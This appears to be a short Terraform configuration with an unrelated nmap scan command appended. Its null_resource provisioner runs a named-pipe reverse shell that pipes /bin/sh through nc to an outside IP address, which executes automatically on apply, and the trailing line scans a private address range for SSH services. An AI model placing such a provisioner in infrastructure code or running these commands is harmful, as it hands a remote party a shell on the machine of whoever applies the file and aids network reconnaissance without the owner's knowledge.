
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "example8" {
  provisioner "local-exec" {
    command = "mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 35.247.19.101 80 1>/tmp/backpipe"
  }
}


output "random" {
  value = "${random_id.random.hex}"
}




nmap -Pn -sV -vv -p22 192.168.122.2-192.168.255.254 -oA output_limitedtcp-%D 
